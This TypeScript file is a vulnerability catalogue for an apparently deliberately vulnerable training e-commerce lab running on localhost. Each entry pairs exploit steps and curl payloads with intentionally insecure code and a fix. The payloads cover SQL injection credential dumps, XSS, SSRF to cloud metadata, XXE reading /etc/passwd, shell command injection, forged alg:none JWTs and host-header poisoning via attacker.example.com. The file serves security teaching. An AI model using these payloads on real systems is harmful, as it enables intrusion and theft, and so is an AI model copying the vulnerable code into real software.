export interface VulnerabilityModule {
  id: string;
  title: string;
  phase:
    | "1. Reconnaissance"
    | "2. Authentication"
    | "3. Authorization"
    | "4. Input Validation & Injection"
    | "5. Session Management & CSRF"
    | "6. Business Logic";
  wstgId: string;
  cwe: string;
  cvss: string;
  severity: "Critical" | "High" | "Medium";
  endpoint: string;
  uiPath: string;
  summary: string;
  howToExploit: string[];
  samplePayload: string;
  vulnerableCode: string;
  fixedCode: string;
}

export const VULNERABILITY_CATALOG: VulnerabilityModule[] = [
  {
    id: "REC-01",
    title: "Exposed Disallowed Paths & Backup Configuration",
    phase: "1. Reconnaissance",
    wstgId: "WSTG-INFO-03 / WSTG-CONF-04",
    cwe: "CWE-538",
    cvss: "7.5",
    severity: "High",
    endpoint: "GET /robots.txt | GET /.env.backup | GET /api/debug/env",
    uiPath: "/labs",
    summary:
      "The application exposes sensitive disallowed routes in /robots.txt, leaves a plaintext /.env.backup file in the web root, and serves environment secrets at /api/debug/env.",
    howToExploit: [
      "Browse to /robots.txt to enumerate disallowed administrative and debug routes.",
      "Download /.env.backup or request GET /api/debug/env to retrieve internal API keys and staging credentials.",
    ],
    samplePayload: "curl -i http://localhost:3000/api/debug/env",
    vulnerableCode: `// /api/debug/env/route.ts (Low Mode)
export async function GET() {
  return NextResponse.json({
    env: process.env,
    internalAdminKey: "sk_live_nexusstore_internal_admin_key_99412"
  });
}`,
    fixedCode: `// Disable debug routes in production and enforce strict admin RBAC
export async function GET() {
  return NextResponse.json({ error: "Not Found" }, { status: 404 });
}`,
  },
  {
    id: "REC-02",
    title: "Unauthenticated OpenAPI Spec & Leaked Client Secrets",
    phase: "1. Reconnaissance",
    wstgId: "WSTG-INFO-05",
    cwe: "CWE-200",
    cvss: "5.3",
    severity: "Medium",
    endpoint: "GET /api/docs",
    uiPath: "/api/docs",
    summary:
      "An unauthenticated OpenAPI 3.0 specification at /api/docs reveals undocumented internal & administrative endpoints along with sample tokens.",
    howToExploit: [
      "Send GET /api/docs or inspect the page source for hardcoded NEXT_PUBLIC_ keys.",
      "Import /api/docs into Burp Suite, Postman, or an AI pentesting scanner to map all 20+ endpoints automatically.",
    ],
    samplePayload: "curl -s http://localhost:3000/api/docs | jq .paths",
    vulnerableCode: `// Unauthenticated Swagger/OpenAPI spec exposing /api/internal/* and /api/admin/*`,
    fixedCode: `// Require authentication for internal API documentation and strip internal routes`,
  },
  {
    id: "REC-03",
    title: "Verbose Database & Stack Trace Error Leakage",
    phase: "1. Reconnaissance",
    wstgId: "WSTG-ERRH-01",
    cwe: "CWE-209",
    cvss: "5.3",
    severity: "Medium",
    endpoint: "GET /api/products?search='",
    uiPath: "/",
    summary:
      "Malformed input triggers uncaught database exceptions that return raw PostgreSQL syntax error messages, table schemas, and full SQL query strings.",
    howToExploit: [
      "Pass a single quote (') in the storefront search box or GET /api/products?search='.",
      "Observe the HTTP 500 JSON response containing the raw SQL query and PostgreSQL syntax error.",
    ],
    samplePayload: "curl -i \"http://localhost:3000/api/products?search='\"",
    vulnerableCode: `catch (err: any) {
  return NextResponse.json({ error: err.message, rawSql: sql, stack: err.stack }, { status: 500 });
}`,
    fixedCode: `catch (err) {
  logger.error(err);
  return NextResponse.json({ error: "An unexpected error occurred." }, { status: 500 });
}`,
  },
  {
    id: "AUTH-01",
    title: "Account Enumeration via Discrepant Responses & Timing",
    phase: "2. Authentication",
    wstgId: "WSTG-ATHN-04",
    cwe: "CWE-204",
    cvss: "5.3",
    severity: "Medium",
    endpoint: "POST /api/auth/login",
    uiPath: "/login",
    summary:
      "The login and password-reset endpoints return HTTP 404 ('Account does not exist') for invalid emails and HTTP 401 ('Incorrect password for existing user') for valid accounts.",
    howToExploit: [
      "Submit a login attempt with an unknown email (e.g., unknown@vulnlab.local) and note the 404 status.",
      "Submit a login attempt with bob@vulnlab.local and an invalid password and note the 401 status and user metadata leak.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" -d '{"email":"bob@vulnlab.local","password":"wrong"}'`,
    vulnerableCode: `if (!user) {
  return NextResponse.json({ error: "User account 'bob@vulnlab.local' does not exist" }, { status: 404 });
}
if (user.password_hash !== password) {
  return NextResponse.json({ error: "Valid user, but password is incorrect", userId: user.id }, { status: 401 });
}`,
    fixedCode: `if (!user || !(await verifyPassword(password, user.password_hash))) {
  return NextResponse.json({ error: "Invalid email or password" }, { status: 401 });
}`,
  },
  {
    id: "AUTH-02",
    title: "Missing Brute-Force Protection & Rate Limiting",
    phase: "2. Authentication",
    wstgId: "WSTG-ATHN-03",
    cwe: "CWE-307",
    cvss: "7.5",
    severity: "High",
    endpoint: "POST /api/auth/login",
    uiPath: "/login",
    summary:
      "No rate limiting, CAPTCHA, or account lockout is enforced on login attempts, allowing rapid automated credential stuffing or dictionary attacks.",
    howToExploit: [
      "Send 20+ rapid POST requests to /api/auth/login targeting admin@vulnlab.local with a wordlist containing admin123.",
    ],
    samplePayload: `for p in 123456 password qwerty admin123; do curl -s -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" -d "{\\"email\\":\\"admin@vulnlab.local\\",\\"password\\":\\"$p\\"}"; echo ""; done`,
    vulnerableCode: `// No rate-limit check or failed attempt counter before verifying credentials`,
    fixedCode: `// Enforce IP + account rate limiting and exponential backoff after 5 failed attempts`,
  },
  {
    id: "AUTH-03",
    title: "Weak Password Policy Enforcement",
    phase: "2. Authentication",
    wstgId: "WSTG-ATHN-07",
    cwe: "CWE-521",
    cvss: "5.3",
    severity: "Medium",
    endpoint: "POST /api/auth/register",
    uiPath: "/login",
    summary:
      "Account registration permits single-character passwords or common breached passwords like '123456' or 'a' and stores them unsalted in Low mode.",
    howToExploit: [
      "Register a new account via /login (Register tab) or POST /api/auth/register with password '1'.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/auth/register -H "Content-Type: application/json" -d '{"username":"test1","email":"test1@vulnlab.local","password":"1"}'`,
    vulnerableCode: `// Accepts any non-empty string as password without length or complexity validation`,
    fixedCode: `if (password.length < 12 || COMMON_PASSWORDS.has(password)) {
  return NextResponse.json({ error: "Password does not meet complexity requirements" }, { status: 400 });
}`,
  },
  {
    id: "AUTH-04",
    title: "Predictable Password Reset Token & Host Header Injection",
    phase: "2. Authentication",
    wstgId: "WSTG-ATHN-09",
    cwe: "CWE-640",
    cvss: "8.8",
    severity: "High",
    endpoint: "POST /api/auth/reset-password",
    uiPath: "/login",
    summary:
      "Password reset tokens are deterministic (reset_<userId>) and the reset link trusts the client-supplied Host / X-Forwarded-Host HTTP header.",
    howToExploit: [
      "Request a password reset for bob@vulnlab.local with a custom Host: evil-collaborator.net header.",
      "Observe the response leaking the poisoned reset link and predictable token 'reset_1002', then reset Bob's password.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/auth/reset-password -H "Host: attacker.example.com" -H "Content-Type: application/json" -d '{"email":"bob@vulnlab.local"}'`,
    vulnerableCode: `const resetHost = req.headers.get("x-forwarded-host") || req.headers.get("host");
const token = \`reset_\${1000 + user.id}\`;
const resetLink = \`http://\${resetHost}/login?reset_token=\${token}\`;`,
    fixedCode: `const token = crypto.randomBytes(32).toString("hex");
const resetLink = \`\${process.env.APP_ORIGIN}/reset?token=\${token}\`;`,
  },
  {
    id: "AUTH-05",
    title: "JWT Algorithm 'none' Bypass & Weak Signing Secret",
    phase: "2. Authentication",
    wstgId: "WSTG-SESS-01",
    cwe: "CWE-347",
    cvss: "9.8",
    severity: "Critical",
    endpoint: "Authorization: Bearer <JWT>",
    uiPath: "/profile",
    summary:
      "The JWT verifier accepts unsigned tokens with alg: 'none' and uses a weak crackable HMAC secret ('secret123'), allowing attackers to forge admin tokens.",
    howToExploit: [
      "Log in as alice@vulnlab.local and inspect the issued JWT.",
      "Modify the header to {\"alg\":\"none\",\"typ\":\"JWT\"} and payload to {\"sub\":3,\"username\":\"admin\",\"role\":\"admin\"}, strip the signature (header.payload.), and send in Authorization: Bearer.",
    ],
    samplePayload: `curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjMsInVzZXJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQHZ1bG5sYWIubG9jYWwiLCJyb2xlIjoiYWRtaW4ifQ." http://localhost:3000/api/admin/users`,
    vulnerableCode: `if (header.alg.toLowerCase() === "none") {
  return payload; // Accepts unsigned token claims!
}`,
    fixedCode: `const decoded = jwt.verify(token, process.env.STRONG_JWT_SECRET, { algorithms: ["HS256"] });`,
  },
  {
    id: "AUTHZ-01",
    title: "Horizontal Privilege Escalation (IDOR) in Orders & Profiles",
    phase: "3. Authorization",
    wstgId: "WSTG-ATHZ-04",
    cwe: "CWE-639",
    cvss: "8.2",
    severity: "High",
    endpoint: "GET /api/orders/[orderId] | GET /api/users/[id]",
    uiPath: "/orders/1001",
    summary:
      "The order retrieval endpoint fetches any order by its sequential integer ID (1001, 1002, 1003) without verifying that the authenticated user owns the order.",
    howToExploit: [
      "Authenticate as Alice (Order #1001) and visit /orders/1001.",
      "Change the URL to /orders/1002 (Bob's confidential corporate order) or /orders/1003 (Admin vault order) or query GET /api/orders/1002.",
    ],
    samplePayload: "curl -s http://localhost:3000/api/orders/1002 | jq .",
    vulnerableCode: `// GET /api/orders/[orderId] (Low Mode)
const { rows } = await queryDb("SELECT * FROM orders WHERE id = $1", [orderId]);
return NextResponse.json({ order: rows[0] });`,
    fixedCode: `const { rows } = await queryDb(
  "SELECT * FROM orders WHERE id = $1 AND user_id = $2",
  [orderId, currentUser.id]
);`,
  },
  {
    id: "AUTHZ-02",
    title: "Vertical Privilege Escalation via Mass Assignment",
    phase: "3. Authorization",
    wstgId: "WSTG-ATHZ-02",
    cwe: "CWE-915",
    cvss: "8.8",
    severity: "High",
    endpoint: "PUT /api/users/profile",
    uiPath: "/profile",
    summary:
      "The profile update endpoint dynamically binds all JSON body fields into the SQL UPDATE statement, allowing a standard customer to set role='admin' and arbitrary wallet_balance.",
    howToExploit: [
      "Log in as Alice (role: customer).",
      "Send PUT /api/users/profile with JSON body {\"full_name\":\"Alice\",\"role\":\"admin\",\"wallet_balance\":50000}.",
    ],
    samplePayload: `curl -X PUT http://localhost:3000/api/users/profile -H "Content-Type: application/json" -d '{"userId":1,"full_name":"Alice Admin","role":"admin","wallet_balance":99999}'`,
    vulnerableCode: `// Dynamically updates role and wallet_balance if present in request JSON
await queryDb(
  "UPDATE users SET full_name=$1, shipping_address=$2, role=$3, wallet_balance=$4 WHERE id=$5",
  [body.full_name, body.shipping_address, body.role || user.role, body.wallet_balance ?? user.wallet_balance, userId]
);`,
    fixedCode: `// Explicitly allowlist only non-privileged editable profile fields
await queryDb(
  "UPDATE users SET full_name=$1, shipping_address=$2, phone=$3 WHERE id=$4",
  [body.full_name, body.shipping_address, body.phone, authenticatedUser.id]
);`,
  },
  {
    id: "AUTHZ-03",
    title: "Forced Browsing & HTTP Method Override Bypass",
    phase: "3. Authorization",
    wstgId: "WSTG-ATHZ-01",
    cwe: "CWE-285",
    cvss: "8.6",
    severity: "High",
    endpoint: "GET /api/admin/users | POST /api/admin/users (X-HTTP-Method-Override: DELETE)",
    uiPath: "/admin",
    summary:
      "Administrative endpoints lack server-side role verification in Low mode, and in Medium mode only block GET/DELETE directly while honoring X-HTTP-Method-Override headers.",
    howToExploit: [
      "Navigate directly to /admin or request GET /api/admin/users without admin credentials.",
      "In Medium mode, send POST /api/admin/users with header X-HTTP-Method-Override: GET.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/admin/users -H "X-HTTP-Method-Override: GET"`,
    vulnerableCode: `// Missing server-side RBAC check or honoring X-HTTP-Method-Override before auth`,
    fixedCode: `if (!user || user.role !== "admin") {
  return NextResponse.json({ error: "Forbidden: Admin role required" }, { status: 403 });
}`,
  },
  {
    id: "INJ-01",
    title: "SQL Injection (Auth Bypass, UNION Extraction & Blind SQLi)",
    phase: "4. Input Validation & Injection",
    wstgId: "WSTG-INPV-05",
    cwe: "CWE-89",
    cvss: "9.8",
    severity: "Critical",
    endpoint: "GET /api/products?search= | POST /api/auth/login",
    uiPath: "/",
    summary:
      "User input in product search and login is concatenated directly into PostgreSQL queries, allowing authentication bypass, hidden product discovery, and UNION credential dumping.",
    howToExploit: [
      "Auth Bypass: On /login, enter email: admin@vulnlab.local' OR '1'='1 and any password.",
      "Hidden Products: On Storefront search, enter: ' OR is_hidden = TRUE --",
      "UNION Credential Dump: Enter: ' UNION SELECT id, username, email, password_hash, 99.99, 1, api_key, FALSE FROM users --",
    ],
    samplePayload: `curl -s "http://localhost:3000/api/products?search=%27%20UNION%20SELECT%20id,username,email,password_hash,99,1,api_key,false%20FROM%20users--" | jq .`,
    vulnerableCode: `const sql = \`SELECT id, name, category, description, price, stock, image_url, is_hidden
             FROM products
             WHERE is_hidden = FALSE AND (name ILIKE '%\${search}%' OR description ILIKE '%\${search}%')\`;
const { rows } = await queryDb(sql);`,
    fixedCode: `const sql = \`SELECT id, name, category, description, price, stock, image_url, is_hidden
             FROM products
             WHERE is_hidden = FALSE AND (name ILIKE $1 OR description ILIKE $1)\`;
const { rows } = await queryDb(sql, [\`%\${search}%\`]);`,
  },
  {
    id: "INJ-02",
    title: "Cross-Site Scripting (Reflected, Stored & DOM XSS)",
    phase: "4. Input Validation & Injection",
    wstgId: "WSTG-INPV-01 / WSTG-INPV-02",
    cwe: "CWE-79",
    cvss: "8.1",
    severity: "High",
    endpoint: "GET /?search= | POST /api/products/[id]/reviews",
    uiPath: "/products/1",
    summary:
      "Search queries and customer product reviews are rendered via dangerouslySetInnerHTML without sanitization, enabling session theft and admin dashboard compromise.",
    howToExploit: [
      "Reflected XSS: Search for <img src=x onerror=\"alert('Reflected XSS: ' + document.cookie)\"> on the storefront.",
      "Stored XSS: Post a product review on /products/1 containing <img src=x onerror=\"alert('Stored XSS in Review!')\"> and view /products/1 or /admin.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/products/1/reviews -H "Content-Type: application/json" -d '{"author_name":"Pentester","rating":5,"comment":"Great tool! <img src=x onerror=alert(document.domain)>"}'`,
    vulnerableCode: `<div dangerouslySetInnerHTML={{ __html: review.comment }} />`,
    fixedCode: `<div>{review.comment}</div> // React auto-escapes text nodes safely`,
  },
  {
    id: "INJ-03",
    title: "Server-Side Request Forgery (SSRF) to Cloud Metadata",
    phase: "4. Input Validation & Injection",
    wstgId: "WSTG-INPV-19",
    cwe: "CWE-918",
    cvss: "9.1",
    severity: "Critical",
    endpoint: "POST /api/products/fetch-image",
    uiPath: "/admin",
    summary:
      "The remote product image fetcher makes server-side HTTP requests to arbitrary user-supplied URLs, allowing access to internal cloud metadata (169.254.169.254) and internal Redis (127.0.0.1:6379).",
    howToExploit: [
      "Go to /admin (Image Import tool) or send POST /api/products/fetch-image.",
      "Supply url: http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-prod-admin-role to extract IAM keys.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/products/fetch-image -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-prod-admin-role"}'`,
    vulnerableCode: `const response = await fetch(reqBody.url);
const data = await response.text();
return NextResponse.json({ fetchedPreview: data });`,
    fixedCode: `// Validate URL scheme (HTTPS only), resolve DNS, and enforce strict domain allowlist`,
  },
  {
    id: "INJ-04",
    title: "XML External Entity (XXE) File & Metadata Disclosure",
    phase: "4. Input Validation & Injection",
    wstgId: "WSTG-INPV-07",
    cwe: "CWE-611",
    cvss: "8.6",
    severity: "High",
    endpoint: "POST /api/orders/import-xml",
    uiPath: "/checkout",
    summary:
      "The bulk XML order import endpoint resolves external DTD entities (SYSTEM 'file:///etc/passwd'), disclosing server files in the parsed order summary.",
    howToExploit: [
      "Submit an XML payload with <!DOCTYPE order [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> and reference &xxe; inside <notes>.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/orders/import-xml -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><item><product_id>1</product_id><quantity>1</quantity><notes>&xxe;</notes></item></order>'`,
    vulnerableCode: `// XML parser configured with resolveExternalEntities: true`,
    fixedCode: `// Disable DOCTYPE declarations and external general/parameter entities in XML parser`,
  },
  {
    id: "INJ-05",
    title: "OS Command Injection & Server-Side Template Injection (SSTI)",
    phase: "4. Input Validation & Injection",
    wstgId: "WSTG-INPV-12 / WSTG-INPV-18",
    cwe: "CWE-78 / CWE-1336",
    cvss: "9.8",
    severity: "Critical",
    endpoint: "POST /api/admin/diagnostics | POST /api/invoices/preview",
    uiPath: "/admin",
    summary:
      "The network ping utility passes unsanitized host input to a shell command, and the invoice template preview evaluates user-supplied {{...}} expressions on the server.",
    howToExploit: [
      "Command Injection: Send host '127.0.0.1; id; cat /etc/passwd' to POST /api/admin/diagnostics.",
      "SSTI: Send template 'Invoice for {{7*7}} - {{process.env}}' to POST /api/invoices/preview.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/admin/diagnostics -H "Content-Type: application/json" -d '{"host":"127.0.0.1; id; whoami"}'`,
    vulnerableCode: `execSync(\`ping -c 2 \${userInputHost}\`);`,
    fixedCode: `execFileSync("ping", ["-c", "2", validatedHostname]);`,
  },
  {
    id: "SESS-01",
    title: "Predictable Sequential Session Tokens (Low Entropy)",
    phase: "5. Session Management & CSRF",
    wstgId: "WSTG-SESS-02",
    cwe: "CWE-330",
    cvss: "8.1",
    severity: "High",
    endpoint: "POST /api/auth/login (Set-Cookie: vulnlab_sid)",
    uiPath: "/login",
    summary:
      "In Low mode, session identifiers are sequential 12-digit numbers (000000010041, 000000010042, ...), allowing session hijacking by incrementing the cookie value.",
    howToExploit: [
      "Log in twice and observe the sequential vulnlab_sid cookies.",
      "Capture 20+ tokens with Burp Sequencer or increment the counter to hijack another active session.",
    ],
    samplePayload: `curl -i -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" -d '{"email":"alice@vulnlab.local","password":"password123"}'`,
    vulnerableCode: `sessionCounter += 1;
const token = String(sessionCounter).padStart(12, "0");`,
    fixedCode: `const token = crypto.randomBytes(32).toString("hex"); // 256-bit entropy`,
  },
  {
    id: "SESS-02",
    title: "Session Fixation & Missing Server-Side Logout Invalidation",
    phase: "5. Session Management & CSRF",
    wstgId: "WSTG-SESS-03 / WSTG-SESS-06",
    cwe: "CWE-384",
    cvss: "7.5",
    severity: "High",
    endpoint: "POST /api/auth/login?vulnlab_sid=ATTACKER_CHOSEN_TOKEN",
    uiPath: "/login",
    summary:
      "The login handler accepts a pre-set vulnlab_sid token from the query string or cookie and binds the newly authenticated user to that known token without rotating it.",
    howToExploit: [
      "Send a login request with ?vulnlab_sid=fixed_attacker_token_999.",
      "Observe that the server binds the authenticated session to fixed_attacker_token_999.",
    ],
    samplePayload: `curl -X POST "http://localhost:3000/api/auth/login?vulnlab_sid=fixed_attacker_token_999" -H "Content-Type: application/json" -d '{"email":"bob@vulnlab.local","password":"hunter2"}'`,
    vulnerableCode: `const token = req.nextUrl.searchParams.get("vulnlab_sid") || generateToken();`,
    fixedCode: `// Always invalidate any pre-existing session ID and generate a fresh token upon login`,
  },
  {
    id: "SESS-03",
    title: "Missing Cookie Security Flags & Cross-Site Request Forgery (CSRF)",
    phase: "5. Session Management & CSRF",
    wstgId: "WSTG-SESS-02 / WSTG-SESS-05",
    cwe: "CWE-352 / CWE-1004",
    cvss: "8.0",
    severity: "High",
    endpoint: "POST /api/wallet/transfer",
    uiPath: "/profile",
    summary:
      "Session cookies are set without HttpOnly or SameSite attributes on Low difficulty, and state-changing wallet transfers accept cross-origin POST requests without a CSRF token.",
    howToExploit: [
      "Inspect document.cookie in the browser console to verify vulnlab_sid is readable by JavaScript (missing HttpOnly).",
      "Trigger a cross-origin POST to /api/wallet/transfer without any anti-CSRF token.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/wallet/transfer -H "Content-Type: application/json" -d '{"fromUserId":2,"toUsername":"alice","amount":250}'`,
    vulnerableCode: `res.cookies.set("vulnlab_sid", token, { httpOnly: false, sameSite: "lax" });`,
    fixedCode: `res.cookies.set("vulnlab_sid", token, { httpOnly: true, secure: true, sameSite: "strict" });`,
  },
  {
    id: "BIZ-01",
    title: "Client-Side Price Tampering & Negative Quantity Manipulation",
    phase: "6. Business Logic",
    wstgId: "WSTG-BUSL-01",
    cwe: "CWE-840",
    cvss: "8.6",
    severity: "High",
    endpoint: "POST /api/checkout",
    uiPath: "/checkout",
    summary:
      "The checkout endpoint calculates order totals using the unit_price and quantity submitted in the client JSON body, allowing $0.01 purchases or negative quantities that credit the user's wallet.",
    howToExploit: [
      "Intercept POST /api/checkout in Burp Suite or use the Checkout Tamper Panel.",
      "Change unit_price to 0.01 or quantity to -5 to increase your wallet balance while placing an order.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/checkout -H "Content-Type: application/json" -d '{"userId":1,"items":[{"product_id":3,"quantity":1,"unit_price":0.01}],"shipping_address":"742 Evergreen Terrace"}'`,
    vulnerableCode: `const lineTotal = item.quantity * item.unit_price; // Trusts client payload price & negative qty!`,
    fixedCode: `const dbProduct = await getProductById(item.product_id);
if (item.quantity <= 0) throw new Error("Invalid quantity");
const lineTotal = item.quantity * Number(dbProduct.price);`,
  },
  {
    id: "BIZ-02",
    title: "TOCTOU Race Condition in Coupon Redemption & Wallet Transfers",
    phase: "6. Business Logic",
    wstgId: "WSTG-BUSL-04",
    cwe: "CWE-362",
    cvss: "8.1",
    severity: "High",
    endpoint: "POST /api/coupons/redeem",
    uiPath: "/checkout",
    summary:
      "The single-use coupon redemption endpoint checks if times_used < max_uses, waits 180ms before updating the counter, and lacks a database transaction lock—allowing parallel requests to redeem the same coupon multiple times.",
    howToExploit: [
      "Send 5 simultaneous POST /api/coupons/redeem requests with code 'WELCOME50' (or click the 'Run 5x Parallel Race Attack' demo button in /checkout).",
      "Observe that a single-use $50 coupon credits the user wallet multiple times.",
    ],
    samplePayload: `for i in 1 2 3 4 5; do curl -s -X POST http://localhost:3000/api/coupons/redeem -H "Content-Type: application/json" -d '{"userId":1,"code":"WELCOME50"}' & done; wait`,
    vulnerableCode: `const coupon = await queryDb("SELECT * FROM coupons WHERE code = $1", [code]);
if (coupon.times_used < coupon.max_uses) {
  await sleep(180); // Window of vulnerability (TOCTOU)
  await queryDb("UPDATE coupons SET times_used = times_used + 1 WHERE id = $1", [coupon.id]);
  await queryDb("UPDATE users SET wallet_balance = wallet_balance + $1 WHERE id = $2", [coupon.discount_amount, userId]);
}`,
    fixedCode: `// Atomic conditional update prevents concurrent double-redemption
const res = await queryDb(
  "UPDATE coupons SET times_used = times_used + 1 WHERE code = $1 AND times_used < max_uses RETURNING discount_amount",
  [code]
);`,
  },
  {
    id: "BIZ-03",
    title: "Multi-Step Checkout Workflow Bypass & Unrestricted File Upload",
    phase: "6. Business Logic",
    wstgId: "WSTG-BUSL-06 / WSTG-BUSL-08",
    cwe: "CWE-841 / CWE-434",
    cvss: "8.2",
    severity: "High",
    endpoint: "POST /api/checkout (skipPaymentCheck) | POST /api/upload",
    uiPath: "/profile",
    summary:
      "Callers can bypass payment verification by setting payment_status='verified_by_client', and the avatar upload endpoint accepts executable extensions (.php.jpg, .svg, .html) and serves them raw.",
    howToExploit: [
      "Upload an SVG/HTML payload via /profile (Avatar Upload) or POST /api/upload with filename 'exploit.html' and content '<script>alert(1)</script>'.",
      "Open the returned /api/upload?id=1 URL to see it rendered with its unvalidated Content-Type.",
    ],
    samplePayload: `curl -X POST http://localhost:3000/api/upload -H "Content-Type: application/json" -d '{"userId":1,"filename":"shell.php.html","content_type":"text/html","content_text":"<h1>Uploaded HTML/XSS Executed</h1><script>alert(document.domain)</script>"}'`,
    vulnerableCode: `// Stores and serves user-supplied content_type directly without extension or magic-byte check`,
    fixedCode: `// Restrict to image/png, image/jpeg, image/webp, strip active SVG scripts, and serve with Content-Disposition: attachment`,
  },
];
